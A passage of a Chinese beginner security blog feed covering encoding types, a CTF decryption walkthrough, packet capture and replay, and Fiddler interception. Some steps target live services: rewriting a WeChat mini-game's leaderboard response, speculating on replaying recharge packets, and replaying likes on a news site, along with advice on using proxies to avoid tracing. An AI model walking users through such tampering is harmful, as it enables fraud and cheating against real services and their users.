        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-密码存储加密"><a href="#0x0-密码存储加密" class="headerlink" title="0x0. 密码存储加密"></a>0x0. 密码存储加密</h2><ul><li><p>MD5：是由32或16位由数字“0-9”和字母“a-f”所组成的字符串，是一种不可逆的加密算法，不区分大小写，其中16位值取的是32位中的8-24位（但是不代表不可以解密，可以使用哈希碰撞进行解密）</p></li><li><p>MD5&amp;salt：加盐操作，用于增强密码存储安全性的技术，由系统随机生成一个盐值（salt），将生成的盐值与用户密码进行拼接，拼接后进行哈希计算，将盐值和哈希值一起存储在数据库中，用以后续验证使用（DISCUZ网站）</p></li><li><p>SHA1（安全哈希算法）：类似于MD5，只不过位数是40，同样是数字“0-9”和字母“a-f”所组成的字符串</p></li><li><p>NTLM：储存在windows的哈希密码，当密码为系统密码时，大概率是NTLM加密算法，和MD5类似，标准通讯安全协议</p></li><li><p>AES、DES、RC4是对称加密算法，引入对称密钥，密文特征与BASE64类似</p></li></ul><h2 id="0x1-传输数据编码"><a href="#0x1-传输数据编码" class="headerlink" title="0x1. 传输数据编码"></a>0x1. 传输数据编码</h2><ul><li><p>BASE64：是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,<strong>结尾通常有符号=</strong>，密文长度不固定，随着明文长度增加而增加</p><p>例如：国外web：www.comresearch.org/researchDetails.php?id=MD== MD==为BASE64编码的1</p></li><li><p>BASE32：特点是明文超过十个后面就会有很多等号，Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个</p></li><li><p>搜狐视频：<a href="https://tv.sohu.com/v/MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==.html">https://tv.sohu.com/v/MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==.html</a> 20211230/n601145510.shtml的base64就是MjAyMTEyMzAvbjYwMTE0NTUxMC5zaHRtbA==</p></li><li><p>URL：由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔</p><p>个人博客： <a href="http://www.xiaodi8.com/search.php?q=%E5%9F%B9%E8%AE%AD">http://www.xiaodi8.com/search.php?q=%E5%9F%B9%E8%AE%AD</a> </p></li><li><p>HEX：是计算机中数据的一种表示方法,将数据进行十六进制转换,它由 0-9,A-F组成</p></li><li><p>ASCII编码：将 128 个字符进行进制数来表示,常见 ASCII 码表大小规则：0~9&lt;A~Z&lt;a~z，详情参考ASCII码表，均由数字组成</p></li><li><p>应用场景：参数传递（注入影响），WAF绕过干扰写法应用，视频地址还原</p></li></ul><h2 id="0x2-JS前端代码加密"><a href="#0x2-JS前端代码加密" class="headerlink" title="0x2. JS前端代码加密"></a>0x2. JS前端代码加密</h2><ul><li><p>JS颜文字：一堆颜文字构成的js代码，AAencode可以直接解密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411140734117.png" alt="image-20240411140734117"></p></li><li><p>jother：只用<mark class="hl-label purple">!+()[]{}</mark> 这八个字符就能完成对任意字符串的编码</p></li><li><p>JSFUCK：与jother很像，只是没有<mark class="hl-label purple">{}</mark> </p></li></ul><h2 id="0x3-后端代码加密"><a href="#0x3-后端代码加密" class="headerlink" title="0x3. 后端代码加密"></a>0x3. 后端代码加密</h2><p>三种常见的后端代码：PHP、.NET、JAVA</p><p>加密原因：某些厂商开发了一些程序后，不想自己开发了几年的程序被别的厂商直接使用并且在上面扩展，此时会对后端源代码进行相应的加密</p><ul><li>PHP：加密后会乱码，一般头部会显示相应的加密方式</li><li>.NET：加密后会变成DLL封装代码，相应的解密工具：<mark class="hl-label purple">ILSpy</mark> </li><li>JAVA：JAR&amp;CLASS文件，相应工具：<mark class="hl-label purple">IDEA</mark>  （和逆向相关联）</li></ul><h2 id="0x4-识别算法编码类型"><a href="#0x4-识别算法编码类型" class="headerlink" title="0x4. 识别算法编码类型"></a>0x4. 识别算法编码类型</h2><ol><li>看密文位数</li><li>看密文的组成特征（数字、字母、大小写、符号等）</li><li>当前密码存在的地方（Web、数据库、操作系统等应用）</li></ol><h2 id="0x5-拓展补充资料"><a href="#0x5-拓展补充资料" class="headerlink" title="0x5. 拓展补充资料"></a>0x5. 拓展补充资料</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析</a></p><p><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结</a></p><p><a href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a></p><h2 id="0x6-CTF实战"><a href="#0x6-CTF实战" class="headerlink" title="0x6. CTF实战"></a>0x6. CTF实战</h2><h3 id="SQL注入漏洞测试（参数加密）综合"><a href="#SQL注入漏洞测试（参数加密）综合" class="headerlink" title="SQL注入漏洞测试（参数加密）综合"></a>SQL注入漏洞测试（参数加密）综合</h3><p>题目链接：<a href="https://www.mozhe.cn/bug/detail/110">https://www.mozhe.cn/bug/detail/110</a></p><p>启动靶场环境，如下图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153031865.png" alt="image-20240411153031865"></p><p>先拿御剑扫一扫后台，看一看有没有相应的隐藏目录</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153427345.png" alt="image-20240411153427345"></p><p>访问一下第一个地址</p><p>发现有一个list.zip,点击下载</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153627355.png" alt="image-20240411153627355"></p><p>点击list.php，里面有这么一串解密代码，通过搜索mcrypt_module_open函数可以知道，这是一种AES加密算法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411153723434.png" alt="image-20240411153723434"></p><p>同时，以下两行代码告诉了我们一些AES加密的参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br></pre></td></tr></table></figure><p>同时，<code>$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</code>告诉我们data又被进行了两次base64加密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411154920767.png" alt="image-20240411154920767"></p><p>查看网站源码，将id拿去解密，根据加密的逆过程，解密先拿去base64解密，再去以加密模式CBC，加密位数128位，加密密码ydhaqPQnexoaDuW3，加密偏移量2018201920202021的解密方式去解密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411155540257.png" alt="image-20240411155540257"></p><div class="note danger modern"><p>AES加密后默认的输出结果是base64编码格式的，所以后续只需进行一次base64加密即可。</p></div><p>base64解密为：eII8c3JeL0t0dxM7wb3Nzg==</p><p>拿去AES解密，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411160146974.png" alt="image-20240411160146974"></p><p>后续涉及SQL注入，就不在这继续写下去</p><h3 id="学逆向-Jsfuck-JSFUCK"><a href="#学逆向-Jsfuck-JSFUCK" class="headerlink" title="学逆向-Jsfuck-JSFUCK"></a>学逆向-Jsfuck-JSFUCK</h3><p>题目链接：<a href="https://www.xuenixiang.cn/ctfexercise-competition-498.html">jsfuck - CTF练习平台_ - 学逆向论坛 - Powered by Discuz! (xuenixiang.cn)</a></p><p>打开附件，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411170553718.png" alt="image-20240411170553718"></p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240411170613875.png" alt="image-20240411170613875"></p><p>发现是一堆符号，联想题目，应该是JSfuck加密，复制去解密，解密为CTF{whatfk}</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 加密解密 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB应用</title>
      <link href="/post/883d81a3.html"/>
      <url>/post/883d81a3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-抓包技术应用意义"><a href="#0x0-抓包技术应用意义" class="headerlink" title="0x0. 抓包技术应用意义"></a>0x0. 抓包技术应用意义</h2><p> 原始数据-&gt;过滤-&gt;分析,这是数据处理的基本套路,抓包的目的就是为了获取到想要的原始数据，拿到数据以后，我们就可以做以下一些事情:</p><ol><li>分析数据传输协议。</li><li>定位网络协议的问题。</li><li>从数据包中获取想要的信息。</li><li>将截取到的数据包进行修改，伪造，重发。</li></ol><div class="note primary no-icon flat"><p>由于网上的某些应用是看不到的，通过抓包分析，我们可以找到隐藏在应用下的IP，进而找到服务器，实现渗透</p></div><h2 id="0x1-抓包工具"><a href="#0x1-抓包工具" class="headerlink" title="0x1. 抓包工具"></a>0x1. 抓包工具</h2><div class="tip info"><p>由于实现原理不同，不同的抓包工具的应用也不同，只抓HTTP/HTTPS的是靠代理进行截取；抓所有的一般是抓取网络接口</p></div><p>Charles（茶杯）：</p><ul><li>优点：排序合理，会帮你把数据包全部排列好，展示的有条理，是一个 HTTP 代理服务器,HTTP 监视器,反转代理服务器，当浏览器连接 Charles 的代理访问互联网时，Charles 可以监控浏览器发送和接收的所有数据</li><li>缺点：查找包和筛选包麻烦，有时需要筛选很久</li></ul><p>Fiddler：是一个 http 协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的 http 通讯、设置断点、查看所有的“进出”Fiddler 的数据（指 cookie,html,js,css 等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露 http 通讯，还提供了一个用户友好的格式（格式很简单）</p><p>Burpsuite：是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报，可以点对点提供信息，更清晰</p><div class="note danger modern"><p>这三种工具基本只能抓web应用（走http协议的）其余协议抓不到</p></div><p>下面介绍其余几种可以抓其他协议的</p><p> Wireshark：是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark 使用 WinPCAP 作为接口，直接与网卡进行数据报文交换，所以基本上所有的协议可以抓到</p><p>科来网络分析系统：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题，可以分进程查看数据包。<mark class="hl-label purple">全中文界面，对新手十分友好</mark> </p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406205327653.png" alt="image-20240406205327653"></p><h2 id="0x2-封包技术"><a href="#0x2-封包技术" class="headerlink" title="0x2. 封包技术"></a>0x2. 封包技术</h2><p>首先要了解抓包和封包有什么区别，其实就是零散和整体的区别，抓包抓的可能是很多零散的包，即一次事件会产生很多个数据包，抓包会把所有的数据包抓出来并一条一条呈现在面前，封包技术就是把一次事件产生的所有数据包放在一起呈现在面前，即<strong>零散和整体</strong>的区别</p><p>使用封包监听工具（傻瓜式一体化抓封包，WPE也可以，但是并不是一体化，有点麻烦）</p><p>下载地址：封包监听工具2.3</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://pan.baidu.com/s/18l6LhKJd3NWPAr46DLQhZw</span><br></pre></td></tr></table></figure><p>提取码：03hz</p><h2 id="0x3-实战案例-使用封包技术完成自动回城"><a href="#0x3-实战案例-使用封包技术完成自动回城" class="headerlink" title="0x3. 实战案例-使用封包技术完成自动回城"></a>0x3. 实战案例-使用封包技术完成自动回城</h2><h3 id="1-下载雷电模拟器"><a href="#1-下载雷电模拟器" class="headerlink" title="1.下载雷电模拟器"></a>1.下载雷电模拟器</h3><p>雷电模拟器是一款可以让手机应用及游戏在电脑上运行的软件，类似于虚拟手机，可以满足我们在PC端进行抓包的需求，同时，雷电模拟器具有运行游戏流畅的功能，比较适配我们本次实验的需求</p><h3 id="2-打开雷电模拟器的端游"><a href="#2-打开雷电模拟器的端游" class="headerlink" title="2.打开雷电模拟器的端游"></a>2.打开雷电模拟器的端游</h3><p>如下图所示，还是熟悉的味道</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240410200940757.png" alt="image-20240410200940757"></p><p>在封包监听工具上选择雷电的进程，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/bc9bf21d177a37ebd6f4fdca8802edeb.png" alt="bc9bf21d177a37ebd6f4fdca8802edeb"></p><p>点击开始抓包，在传奇的界面上点击回城，点击后立马点击停止抓包，抓取到的包如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/35a14f59ecf1778f8d9e31a48930872a.png" alt="35a14f59ecf1778f8d9e31a48930872a"></p><p>我们只需关注发送包，重复发送相应的发送包，可以看到人物自动回城</p><div class="note danger modern"><p>看着很没用，但是如果我们在充值的时候拦截封包，并重复发送封包，是否能达到重复充值的功能</p><p>我的设想，没敢尝试，也没必要为了这个充10块钱💩💩💩</p></div>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 抓包封包技术 </tag>
            
            <tag> 协议 </tag>
            
            <tag> APP </tag>
            
            <tag> PC应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fiddler抓取微信小程序包</title>
      <link href="/post/20fa1015.html"/>
      <url>/post/20fa1015.html</url>
      
        <content type="html"><![CDATA[<p class='p center logo large red'>声明</p><ul><li><p>该博客大部分文章来自作者日常学习笔记，未经授权，严禁转载，如需转载，联系我</p></li><li><p>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本博客无关</p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>0x0.前言</p></div></div></h2><div class="note primary no-icon flat"><p>最近看了看一些公众号上的文章，发现一个用fiddler抓取羊了个羊的教程。对我这种小白来说，这种实验既有吸引力复现难度也不高，所以打算自己动手实操一下😍😍😍</p><p>以下内容是对本次实验的复现</p></div><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 60%" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100"><p>0x1.实验准备</p></div></div></h2><h3 id="1-fiddler简介"><a href="#1-fiddler简介" class="headerlink" title="1. fiddler简介"></a>1. fiddler简介</h3><div class="note primary no-icon flat"><p>最开始的时候，发现作者使用了fiddler这个工具，当时没听说过这个工具，很好奇和burp、wireshark有什么区别，后来在实际应用中呢，发现它好像综合了burp和wireshark，fiddler可以将网络传输发送与接收的数据包进行截获、重发、编辑和转存等操作；fiddler是通过改写HTTP代理，让数据从它那里通过，并监控并且截取到数据，并且在打开的一瞬间设置好了浏览器代理，关闭fiddler的时候，它又把代理还原了，这一点比burp好用多了，不像burp有时候忘记关代理，浏览器直接用不了🥵🥵</p><p>我个人觉得比较好的是fiddler的界面比较好看，没有wireshark那么单调，直接上图 </p></div><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412164247019.png" alt="image-20240412164247019"></p><p>fiddler自带的图标可以很明确的告诉我们一些相关的信息，可以来说非常的方便</p><h3 id="2-下载Fiddler-Classic"><a href="#2-下载Fiddler-Classic" class="headerlink" title="2. 下载Fiddler Classic"></a>2. 下载Fiddler Classic</h3><p>👉<a href="https://www.telerik.com/download/fiddler">快速通道</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240405112335917.png" alt="image-20240405112335917"></p><p>下载exe文件后无脑安装，嘎嘎下一步就行，选好自己的路径就可以</p><h3 id="3-下载并安装Fiddler证书生成器"><a href="#3-下载并安装Fiddler证书生成器" class="headerlink" title="3. 下载并安装Fiddler证书生成器"></a>3. 下载并安装Fiddler证书生成器</h3><p>👇 👇 👇 👇 👇 👇</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2</span><br></pre></td></tr></table></figure><h3 id="4-配置Fiddler"><a href="#4-配置Fiddler" class="headerlink" title="4. 配置Fiddler"></a>4. 配置Fiddler</h3><p>打开Fiddler，点击Tools——&gt;Options</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b3e9920fd4e8f1ab0bcc1b870382af8c.png" alt="b3e9920fd4e8f1ab0bcc1b870382af8c"></p><p>进入HTTPS选项进行设置，勾选如下图所示即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/bcaf5114f203da95138d603f777eb90c.png" alt="bcaf5114f203da95138d603f777eb90c"></p><p>之后点击右上角Actions选项，选择Export Root Certificate to Desktop，将Fiddler的证书导入在桌面上，你的桌面上将会出现FiddlerRoot.cer文件，点击OK设置成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/faaa66ac42053ae9d274d8b8a2d094f8.png" alt="faaa66ac42053ae9d274d8b8a2d094f8"></p><p>点击Connections，设置如下所示，将端口号设置为8888，勾选如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/94dcbf2b5255953c34912722586a8d53.png" alt="94dcbf2b5255953c34912722586a8d53"></p><p>设置完之后重启Fiddler，就可以开始抓包了</p><h3 id="5-浏览器导入FiddlerRoot-cer证书"><a href="#5-浏览器导入FiddlerRoot-cer证书" class="headerlink" title="5. 浏览器导入FiddlerRoot.cer证书"></a>5. 浏览器导入FiddlerRoot.cer证书</h3><p>以Edge浏览器为例，打开浏览器设置，在设置的搜索框中输入证书，找到管理证书界面，并点击</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c512f2bde23d9420e3b11b55d10cc588.png" alt="c512f2bde23d9420e3b11b55d10cc588"></p><p>找到受信任的根证书颁发机构，点击导入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f4f2ce705bc1e83d7de13adb19c6b690.png" alt="f4f2ce705bc1e83d7de13adb19c6b690"></p><p>按照它的指导将FiddlerRoot.cer导入进去，导入之后重启Fiddler就可以抓包了</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>0x2.开始抓包</p></div></div></h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0f8c368c50b7f8166d9298dd380829d3.png" alt="0f8c368c50b7f8166d9298dd380829d3"></p><p>打开微信，点击右上角设置按钮，进入设置页面，使用代理点击开启</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5ce248d1c14c895ad2ab24766216cd80.png" alt="5ce248d1c14c895ad2ab24766216cd80"></p><p>填写如下所示，地址填写主机ip地址，端口填写Fiddler设置的端口号，点击确定即可（<strong>注意一定要将fiddler打开，不然连接不上</strong>）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110429389.png" alt="image-20240406110429389"></p><p>看到有WeChat包的时候说明此时可以抓取到WeChat，之后点击小程序，打开羊了个羊</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110631667.png" alt="image-20240406110631667"></p><p>看到这个sheep的，就知道是抓取到了羊了个羊</p><p>如果要修改排名信息，可以点开排行榜，可以看到我们抓取到了相关的数据包，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111527252.png" alt="image-20240406111527252"></p><p>设置断点，准备拦截下一次的请求，找到主页框Rules。下拉找到Automatic Breakpoint，点击Before Requests，即在全部请求前设置断点</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111649105.png" alt="image-20240406111649105"></p><p>之后再打开羊了个羊的排行榜，发现排行榜加载不出来，说明拦截成功，接下来改包返回即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111853888.png" alt="image-20240406111853888"></p><p>在fiddler界面上，点击Break on response，在Raw下改包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/af6d4b3d035435f128c530a112758836.png" alt="af6d4b3d035435f128c530a112758836"></p><p>改好后点击Run to Completion，看羊了个羊主界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1aae3ef95fc8d40fdd64c1b470b02a29.png" alt="1aae3ef95fc8d40fdd64c1b470b02a29"></p><p>改包成功！！！</p><div class="note danger modern"><p>操作有风险，模仿需谨慎</p></div>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 随便试试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-Web应用&amp;架构建设&amp;漏洞&amp;HTTP数据包&amp;代理服务器</title>
      <link href="/post/16b91a53.html"/>
      <url>/post/16b91a53.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-知识点速览"><a href="#0x0-知识点速览" class="headerlink" title="0x0. 知识点速览"></a>0x0. 知识点速览</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="0x1-网站搭建前置知识"><a href="#0x1-网站搭建前置知识" class="headerlink" title="0x1. 网站搭建前置知识"></a>0x1. 网站搭建前置知识</h2><p>域名：符号化的地址方案，来代替数字型的 IP 地址，每一个符号化的地址都与特定的IP地址对应，为了方便人们记忆而不用记住IP地址</p><p>DNS：Domain Name System，域名系统，因特网上作为域名和IP地址互相映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p><h2 id="0x2-WEB应用环境架构类"><a href="#0x2-WEB应用环境架构类" class="headerlink" title="0x2. WEB应用环境架构类"></a>0x2. WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构：</p><p><strong>开发语言，程序源码，中间容器，数据库类型，服务器操作系统，第三方软件等</strong></p><ul><li>开发语言：asp，php,aspx,jsp,java,python,ruby,go,html等</li><li>程序源码：根据开发语言分类；应用类型分类（交友||论坛||博客）；开源CMS分类（用的人多了之后变成CMS源码）；开发框架分类（源码封装后变为框架，直接调用）等</li><li>中间件容器（支持网站运行）：IIS，Apache，Nginx，Tomcat，Weblogic，Jboos，glasshfish等</li><li>数据库类型：Access，Mysql，Oracle，db2，Sybase，Redis，MongoDB</li><li>服务器操作系统：Linux、Windows、Mac系列</li><li>第三方软件：phpmyadmin，vs-ftpd，VNC，ELK，Openssh等</li></ul><p>通过详细了解上述角色功能架构，可以方便我们对症下药，在爆出漏洞的第一时间知道相关的知识</p><h2 id="0x3-WEB应用安全漏洞分类"><a href="#0x3-WEB应用安全漏洞分类" class="headerlink" title="0x3. WEB应用安全漏洞分类"></a>0x3. WEB应用安全漏洞分类</h2><p>明白一个理念，关于WEB应用安全的漏洞，大部分都是在程序源码中产生的（<strong>代码写的不好产生安全问题</strong>）</p><ul><li><p>SQL注入：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></li><li><p>文件安全：用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器</p></li><li><p>RCE执行：RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p></li><li><p>XSS跨站：跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击</p></li><li><p>CRLF：这个漏洞名词来源于打印机，在计算机中表示一行的结束，通过控制CR和LF的出现，在拼接http响应头的过程中，服务器检测到<code>\r\n</code>的时候会按照http规范认为已经到达一行的末尾，后面的数据输出到下一行。在对文件进行io读写的时候也经常会以<code>\r\n</code>或者<code>\n</code>作为判断行末尾的依据，后面的数据换行后再输出</p></li><li><p>SSRF：SSRF的意思是服务端请求伪造，如字面意思，就是攻击者构造的由服务器发起请求的一种漏洞。而服务端能够访问外界访问不到的内网，因此可以利用这个特性来攻击部署在内网的脆弱中间件以及其他服务</p></li><li><p>CSRF：中文翻译叫跨站请求伪造，和XSS利用方式有点像，但是XSS利用的是站点内信任的用户，而CSRF是通过伪装成被信任的用户请求受信任网站</p></li><li><p>反序列化：反序列化就是指把字节序列恢复为Java对象的过程</p></li><li><p>逻辑越权：逻辑越权漏洞就是当用户跳过自己的权限限制，去操作同等级用户或者上级用户。正常的情况下，当一个用户去访问某个资源的时候，首先需要去登录验证自己的权限，其次是对数据的查询，最后返回数据内容。但是如果在权限验证这里，出现了验证不足或者根本就没有验证，那么就会导致越权漏洞的出现</p></li><li><p>未授权访问：是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作</p></li><li><p>XXE/XML：外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互</p></li><li><p>弱口令安全：使用别人容易猜测到的或者破解工具容易破解的口令</p></li></ul><h2 id="0x4-HTTP状态码相关"><a href="#0x4-HTTP状态码相关" class="headerlink" title="0x4. HTTP状态码相关"></a>0x4. HTTP状态码相关</h2><p>文件夹目录返回403，表示文件夹存在（<strong>403为权限不够，不能查看文件夹目录</strong>）404表示不存在</p><p>文件返回200存在，返回404不存在</p><p>3xx表示跳转：处置过程，判断可有可无</p><p>5xx表示内部错误：服务器问题，文件判断可有可无</p><p>所以在使用目录扫描时，3xx和5xx一般勾选上（自己无法判断，宁可错误也别放过）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406172115150.png" alt="image-20240406172115150"></p><h2 id="0x5-代理服务"><a href="#0x5-代理服务" class="headerlink" title="0x5. 代理服务"></a>0x5. 代理服务</h2><p>代理包括内部代理和远程代理，内部代理就是burp、fiddler等一类中间工具</p><p>远程代理：快速更换代理，防止被拉黑被溯源，防止身份鉴别（web搜索<strong>快代理</strong>可以购买）</p><h2 id="0x6-演示案例"><a href="#0x6-演示案例" class="headerlink" title="0x6. 演示案例"></a>0x6. 演示案例</h2><h3 id="1-请求包-新闻回帖点赞-重放数据包"><a href="#1-请求包-新闻回帖点赞-重放数据包" class="headerlink" title="1.请求包-新闻回帖点赞-重放数据包"></a>1.请求包-新闻回帖点赞-重放数据包</h3><div class="note danger modern"><p>仅对于无身份认证的网页有效，有身份认证的无法重复刷赞（代码逻辑不一样，限定条件不一样）</p></div><p>将浏览器配置改为和自己burp配置相同（推荐一个小工具，Edge插件proxy switcher）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/a9bfca6a5fe6d48175660023e6ffad58.png" alt="a9bfca6a5fe6d48175660023e6ffad58"></p><p>打开新浪网，随便点开一个新闻，进入评论，同时把burp的拦截打开</p><p><img 